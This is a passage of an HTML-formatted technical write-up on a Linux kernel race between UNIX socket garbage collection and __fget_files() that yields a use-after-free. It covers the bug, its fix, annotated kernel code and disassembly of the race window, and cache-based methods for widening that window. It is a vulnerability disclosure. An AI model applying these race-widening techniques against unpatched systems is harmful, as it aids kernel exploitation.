class="c3"&gt;&lt;span&gt;This is a writeup of how I managed to hit the race on a normal Linux desktop kernel, with a hit rate somewhere around 30% if the proof of concept has been tuned for the specific machine. I didn&amp;#39;t do a full exploit though, I stopped at getting evidence of use-after-free (UAF) accesses (with the help of a very large file descriptor table and &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://lwn.net/Articles/819834/"&gt;userfaultfd&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;, which might not be available to normal users depending on system configuration) because that&amp;#39;s the part I was curious about.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;This also demonstrates that even very small race conditions can still be exploitable if someone sinks enough time into writing an exploit, so be careful if you dismiss very small race windows as unexploitable or don&amp;#39;t treat such issues as security bugs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The UAF reproducer is &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2247#c6"&gt;in our bugtracker&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.qtcj62oowcyh"&gt;&lt;span class="c8"&gt;The bug&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;In the UNIX domain socket garbage collection code (which is needed to deal with reference loops formed by UNIX&lt;/span&gt;&lt;span&gt;&amp;nbsp;domain sockets&lt;/span&gt;&lt;span&gt;&amp;nbsp;that use &lt;/span&gt;&lt;span class="c4"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;file descriptor passing), the kernel tries to figure out whether it can account for all references to some file by comparing the file&amp;#39;s refcount with the number of references from inflight SKBs (socket buffers). If they are equal, it assumes that the UNIX domain sockets subsystem effectively has exclusive access to the file because it owns all references.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;(The same pattern also appears for files as an optimization in &lt;/span&gt;&lt;span class="c4"&gt;__fdget_pos()&lt;/span&gt;&lt;span&gt;, see &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://lore.kernel.org/lkml/CAG48ez1pnatAB095dnbrn9LbuQe4+ENwh-WEW36pM40ozhpruw@mail.gmail.com/"&gt;this LKML thread&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The problem is that &lt;/span&gt;&lt;span class="c4"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;can also be referenced from an RCU read-side critical section (which you can&amp;#39;t detect by looking at the refcount), and such an RCU reference can be upgraded into a refcounted reference using &lt;/span&gt;&lt;span class="c4"&gt;get_file_rcu()&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class="c4"&gt;get_file_rcu_many()&lt;/span&gt;&lt;span&gt;&amp;nbsp;by &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;as long as the refcount is non-zero. For example, when this happens in the &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;syscall, the resulting reference will then be installed in the FD table and be available for subsequent syscalls.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;When the garbage collector (GC) believes that it has exclusive access to a file, it will perform operations on that file that violate the locking rules used in normal socket-related syscalls such as &lt;/span&gt;&lt;span class="c4"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;- &lt;/span&gt;&lt;span class="c4"&gt;unix_stream_read_generic()&lt;/span&gt;&lt;span&gt;&amp;nbsp;assumes that queued SKBs can only be removed under the &lt;/span&gt;&lt;span class="c4"&gt;-&amp;gt;iolock&lt;/span&gt;&lt;span&gt;&amp;nbsp;mutex, but the GC removes queued SKBs without using that mutex. (Thanks to Xingyu Jin for explaining that to me.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;One way of looking at this bug is that the GC is working correctly - here&amp;#39;s a state diagram showing some of the possible states of a &lt;/span&gt;&lt;span class="c4"&gt;struct file&lt;/span&gt;&lt;span class="c1"&gt;, with more specific states nested under less specific ones and with the state transition in the GC marked:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiUbfoAfxrHV-Pi1NNsfr3MrKbRDIuiWObxlGl2OaM5pty9rc1DB96iJpDBwZDCeTda9QLXGYV-NImje4yj5MNf64YcJHCV7h6QPXfqcvBXBT3cnZje6P8hVSrWDDHQIZJlozNTa4wm8cGdBlRo0EB2CaRvQymdhA26bkyBbNP2Ja7RRdoLZCD6XaKyw/s641/image19.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiUbfoAfxrHV-Pi1NNsfr3MrKbRDIuiWObxlGl2OaM5pty9rc1DB96iJpDBwZDCeTda9QLXGYV-NImje4yj5MNf64YcJHCV7h6QPXfqcvBXBT3cnZje6P8hVSrWDDHQIZJlozNTa4wm8cGdBlRo0EB2CaRvQymdhA26bkyBbNP2Ja7RRdoLZCD6XaKyw/s600/image19.png" border="0" alt="All relevant states are RCU-accessible. An RCU-accessible object can have either a zero refcount or a positive refcount. Objects with a positive refcount can be either live or owned by the garbage collector. When the GC attempts to grab a file, it transitions from the state &amp;quot;live&amp;quot; to the state &amp;quot;owned by GC&amp;quot; by getting exclusive ownership of all references to the file." style="max-height: 750; max-width: 600;"title="All relevant states are RCU-accessible. An RCU-accessible object can have either a zero refcount or a positive refcount. Objects with a positive refcount can be either live or owned by the garbage collector. When the GC attempts to grab a file, it transitions from the state &amp;quot;live&amp;quot; to the state &amp;quot;owned by GC&amp;quot; by getting exclusive ownership of all references to the file." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;While &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;is making an incorrect assumption about the state of the &lt;/span&gt;&lt;span class="c4"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;while it is trying to narrow down its possible states - it checks whether &lt;/span&gt;&lt;span class="c4"&gt;get_file_rcu()&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class="c4"&gt;get_file_rcu_many()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;succeeds, which narrows the file&amp;#39;s state down a bit but not far enough:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTef37oRtM-RWk6371VrhcG8EKNsAQaNWvirGWbl0J8RIHY-YV-xhFdqpoij3Ofds9hnAAngEIJrtyMXKmY-Fw4en-IXOQsXMIQMQkOgRIGlKm70Ck4Q3tlYNkft6zKm4t5p3FRAmEVFmhTccmTO3ZcDQbBOZYB0a00w8DPjEBqCywmuHu5rosOaEIPg/s638/image10.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTef37oRtM-RWk6371VrhcG8EKNsAQaNWvirGWbl0J8RIHY-YV-xhFdqpoij3Ofds9hnAAngEIJrtyMXKmY-Fw4en-IXOQsXMIQMQkOgRIGlKm70Ck4Q3tlYNkft6zKm4t5p3FRAmEVFmhTccmTO3ZcDQbBOZYB0a00w8DPjEBqCywmuHu5rosOaEIPg/s600/image10.png" border="0" alt="__fget_files() first uses get_file_rcu() to conditionally narrow the state of a file from &amp;quot;any RCU-accessible state&amp;quot; to &amp;quot;any refcounted state&amp;quot;. Then it has to narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot;, but instead it just assumes that they are equivalent." style="max-height: 750; max-width: 600;"title="__fget_files() first uses get_file_rcu() to conditionally narrow the state of a file from &amp;quot;any RCU-accessible state&amp;quot; to &amp;quot;any refcounted state&amp;quot;. Then it has to narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot;, but instead it just assumes that they are equivalent." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;And this directly leads to how &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=054aa8d439b9185d4f5eb9a90282d1ce74772969"&gt;the bug was fixed&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(there&amp;#39;s &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e386dfc56f837da66d00a078e5314bc8382fab83"&gt;another follow-up patch&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but that one just tries to clarify the code and recoup some of the resulting performance loss) - the fix adds another check in &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;to properly narrow down the state of the file such that the file is guaranteed to be live&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUJDE3REJXgTw3j8aGxUwVTrr2H1D6Fnf0BeMUdcCYXqyCcok6eHx_7cnZ3MDLBQxbcn5ePuGnzzgoo2GjQGTK7aYVqPlwoqJ8UXOuEowvE59T436Fo2NK3O7p59Jfo9fYo3oFMfxQ8wxDAnzXVNf4nJ5t_IQ8QPQYffvWfjQpUaFqInyrBk8i9kbKg/s638/image16.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUJDE3REJXgTw3j8aGxUwVTrr2H1D6Fnf0BeMUdcCYXqyCcok6eHx_7cnZ3MDLBQxbcn5ePuGnzzgoo2GjQGTK7aYVqPlwoqJ8UXOuEowvE59T436Fo2NK3O7p59Jfo9fYo3oFMfxQ8wxDAnzXVNf4nJ5t_IQ8QPQYffvWfjQpUaFqInyrBk8i9kbKg/s600/image16.png" border="0" alt="The fix is to properly narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot; by checking whether the file is still referenced by a file descriptor table entry." style="max-height: 750; max-width: 600;"title="The fix is to properly narrow the state from &amp;quot;any refcounted state&amp;quot; to &amp;quot;live&amp;quot; by checking whether the file is still referenced by a file descriptor table entry." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;The fix ensures that a live reference can only be derived from another live reference by comparing with an FD table entry, which is guaranteed to point to a live object.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c16"&gt;[Sidenote: This scheme is similar to the one used for &lt;/span&gt;&lt;span class="c4 c16"&gt;struct page&lt;/span&gt;&lt;span class="c16"&gt;&amp;nbsp;- &lt;/span&gt;&lt;span class="c4 c16"&gt;gup_pte_range()&lt;/span&gt;&lt;span class="c16"&gt;&amp;nbsp;also uses the &amp;quot;grab pointer, increment refcount, recheck pointer&amp;quot; pattern for locklessly looking up a &lt;/span&gt;&lt;span class="c4 c16"&gt;struct page&lt;/span&gt;&lt;span class="c16"&gt;&amp;nbsp;from a page table entry while ensuring that new refcounted references can&amp;#39;t be created without holding an existing reference. This is really important for &lt;/span&gt;&lt;span class="c4 c16"&gt;struct page&lt;/span&gt;&lt;span class="c16"&gt;&amp;nbsp;because a page can be given back to the page allocator and reused while &lt;/span&gt;&lt;span class="c4 c16"&gt;gup_pte_range()&lt;/span&gt;&lt;span class="c16"&gt;&amp;nbsp;holds an uncounted reference to it - freed pages still have their &lt;/span&gt;&lt;span class="c4 c16"&gt;struct page&lt;/span&gt;&lt;span class="c13"&gt;, so there&amp;#39;s no need to delay freeing of the page - so if this went wrong, you&amp;#39;d get a page UAF.]&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;My initial suggestion was to instead fix the issue by changing how &lt;/span&gt;&lt;span class="c4"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;ensures that it has exclusive access, letting it set the file&amp;#39;s refcount to zero to prevent turning RCU references into refcounted ones; this would have avoided adding any code in the hot &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;path, but it would have only fixed &lt;/span&gt;&lt;span class="c4"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;, not the &lt;/span&gt;&lt;span class="c4"&gt;__fdget_pos()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;case I discovered later, so it&amp;#39;s probably a good thing this isn&amp;#39;t how it was fixed:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHXC99z29mPOQIAGScNNSVvzjt3hy7-8rmPIDE88sfR2DZwMZM0sCUamWA6Fe_sEKXIpbCrDDvbynhyqUWW6PK2sln9GqxqY1R2uXLmPwRmRyQYNeogwnbjTbcdob_VmvNlJ36TWMrTc48wHCcXd7_40UB3uaJNeOJLiFL7NRT_VbqNsYh780UdE8Xlw/s641/image5.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHXC99z29mPOQIAGScNNSVvzjt3hy7-8rmPIDE88sfR2DZwMZM0sCUamWA6Fe_sEKXIpbCrDDvbynhyqUWW6PK2sln9GqxqY1R2uXLmPwRmRyQYNeogwnbjTbcdob_VmvNlJ36TWMrTc48wHCcXd7_40UB3uaJNeOJLiFL7NRT_VbqNsYh780UdE8Xlw/s600/image5.png" border="0" alt="" style="max-height: 750; max-width: 600;"title="" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c16"&gt;[Sidenote: In my original bug report I wrote that you&amp;#39;d have to wait an RCU grace period in the GC for this, but that wouldn&amp;#39;t be necessary as long as the GC ensures that a reaped socket&amp;#39;s refcount never becomes non-zero again.]&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.60irov9pzlh"&gt;&lt;span class="c8"&gt;The race&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;There are multiple race conditions involved in exploiting this bug, but by far the trickiest to hit is that we have to race an operation into the tiny race window in the middle of &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which can e.g. be reached via &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;), between the file descriptor table lookup and the refcount increment:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;static struct file *__fget_files(struct files_struct *files, unsigned int fd,&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;fmode_t mask, unsigned int refs)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; struct file *file;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcu_read_lock();&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;loop:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; file = &lt;/span&gt;&lt;span class="c6 c18 c9"&gt;files_lookup_fd_rcu(files, fd)&lt;/span&gt;&lt;span class="c4 c9"&gt;; &lt;/span&gt;&lt;span class="c5"&gt;// race window start&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (file) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; /* File object ref couldn&amp;#39;t be taken.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* dup2() atomicity guarantee is the reason&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* we loop to catch the new file (or NULL pointer)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (file-&amp;gt;f_mode &amp;amp; mask)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; file = NULL;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; else if (!&lt;/span&gt;&lt;span class="c6 c9 c18"&gt;get_file_rcu_many(file, refs)&lt;/span&gt;&lt;span class="c4 c9"&gt;) &lt;/span&gt;&lt;span class="c5"&gt;// race window end&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; goto loop;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcu_read_unlock();&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return file;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;In this race window&lt;/span&gt;&lt;span&gt;, th&lt;/span&gt;&lt;span&gt;e file descriptor must be closed (to drop the FD&amp;#39;s reference to the file) and a &lt;/span&gt;&lt;span class="c4"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;run must get past the point where it checks the file&amp;#39;s refcount (&amp;quot;&lt;/span&gt;&lt;span class="c4 c24"&gt;total_refs = file_count(u-&amp;gt;sk.sk_socket-&amp;gt;file)&lt;/span&gt;&lt;span class="c1"&gt;&amp;quot;).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;In the Debian 5.10.0-9-amd64 kernel at version 5.10.70-1, that race window looks as follows:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x1e&amp;gt; cmp &amp;nbsp; &amp;nbsp;r10,rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x21&amp;gt; sbb &amp;nbsp; &amp;nbsp;rax,rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x24&amp;gt; mov &amp;nbsp; &amp;nbsp;rdx,QWORD PTR [r11+0x8]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x28&amp;gt; and &amp;nbsp; &amp;nbsp;eax,r8d&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x2b&amp;gt; lea &amp;nbsp; &amp;nbsp;rax,[rdx+rax*8]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;&amp;lt;__fget_files+0x2f&amp;gt; mov &amp;nbsp; &amp;nbsp;r12,QWORD PTR [rax] &lt;/span&gt;&lt;span class="c22 c6 c18 c9"&gt;; RACE WINDOW START&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c22 c6 c18 c9"&gt;; r12 now contains file*&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x32&amp;gt; test &amp;nbsp; r12,r12&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x35&amp;gt; je &amp;nbsp; &amp;nbsp; ffffffff812e3df7 &amp;lt;__fget_files+0x77&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x37&amp;gt; mov &amp;nbsp; &amp;nbsp;eax,r9d&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;&amp;lt;__fget_files+0x3a&amp;gt; and &amp;nbsp; &amp;nbsp;eax,DWORD PTR [r12+0x44] &lt;/span&gt;&lt;span class="c6 c18 c9 c22"&gt;; LOAD (for -&amp;gt;f_mode)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x3f&amp;gt; jne &amp;nbsp; &amp;nbsp;ffffffff812e3df7 &amp;lt;__fget_files+0x77&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;&amp;lt;__fget_files+0x41&amp;gt; mov &amp;nbsp; &amp;nbsp;rax,QWORD PTR [r12+0x38] &lt;/span&gt;&lt;span class="c22 c6 c18 c9"&gt;; LOAD (for -&amp;gt;f_count)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x46&amp;gt; lea &amp;nbsp; &amp;nbsp;rdx,[r12+0x38]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x4b&amp;gt; test &amp;nbsp; rax,rax&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x4e&amp;gt; je &amp;nbsp; &amp;nbsp; ffffffff812e3def &amp;lt;__fget_files+0x6f&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;lt;__fget_files+0x50&amp;gt; lea &amp;nbsp; &amp;nbsp;rcx,[rsi+rax*1]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;&amp;lt;__fget_files+0x54&amp;gt; lock cmpxchg QWORD PTR [rdx],rcx &lt;/span&gt;&lt;span class="c6 c18 c9"&gt;; RACE WINDOW END (on cmpxchg success)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;As you can see, the race window is fairly small - around 12 instructions, assuming that the &lt;/span&gt;&lt;span class="c4"&gt;cmpxchg&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;succeeds.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.dhdzjamcop53"&gt;&lt;span class="c8"&gt;Missing some cache&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;Luckily for us, the race window contains the first few memory accesses to the &lt;/span&gt;&lt;span class="c4"&gt;struct file&lt;/span&gt;&lt;span&gt;; therefore, by making sure that the &lt;/span&gt;&lt;span class="c4"&gt;struct file&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not present in the fastest CPU caches, we can widen the race window by as much time as the memory accesses take. The standard way to do this is to use &lt;/span&gt;&lt;span&gt;an eviction pattern&lt;/span&gt;&lt;span&gt;&amp;nbsp;/ &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://www.cs.columbia.edu/~simha/spyjs.ccs15.pdf"&gt;eviction set&lt;/a&gt;&lt;/span&gt;&lt;span&gt;; but instead we can also make the cache line dirty on another core (see &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://dreamsofastone.blogspot.com/2016/02/row-hammer-java-script-and-mesi.html"&gt;Anders Fogh&amp;#39;s blogpost&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for more detail). (I&amp;#39;m not actually sure about the intricacies of how much latency this adds on different manufacturers&amp;#39; CPU cores, or on different CPU generations - I&amp;#39;ve only tested different versions of my proof-of-concept on Intel Skylake and Tiger Lake. Differences in cache &lt;/span&gt;&lt;span&gt;coherency&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;protocols or snooping might make a big difference.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;For the cache line containing the flags and refcount of a &lt;/span&gt;&lt;span class="c4"&gt;struct file&lt;/span&gt;&lt;span&gt;, this can be done by, on another CPU, temporarily bumping its refcount up and then changing it back down, e.g. with &lt;/span&gt;&lt;span class="c4"&gt;close(dup(fd))&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;(or just by accessing the FD in pretty much any way from a multithreaded process).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;However, when we&amp;#39;re trying to hit the race in &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span&gt;&amp;nbsp;via &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span&gt;, we don&amp;#39;t want any cache misses to occur before we hit the race window - that would slow us down and probably make us miss the race. To prevent that from happening, we can call &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;with a different FD number for a warm-up run shortly before attempting the race. Because we also want the relevant 